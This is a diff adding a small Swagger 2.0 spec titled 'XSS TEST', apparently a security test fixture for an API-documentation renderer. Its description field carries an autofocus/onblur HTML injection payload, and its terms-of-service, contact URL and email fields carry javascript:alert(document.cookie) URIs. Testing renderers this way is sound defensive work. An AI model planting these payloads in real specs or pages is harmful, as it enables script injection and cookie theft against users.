@@ -1,0 +1,12 @@
+{
+  "swagger": "2.0",
+  "info": 
+  {"title": "XSS TEST",
+  "description": "</p><a onblur=alert(1) tabindex=1 id=x>link test2</a><input autofocus><p>",
+  "termsOfService": "javascript:alert(document.cookie)"},
+  "contact": 
+  {"name": "AHNLAB",
+    "url": "javascript:alert(document.cookie)",
+    "email": "javascript:alert(document.cookie)"},
+  "version": "1.0.1"
+}
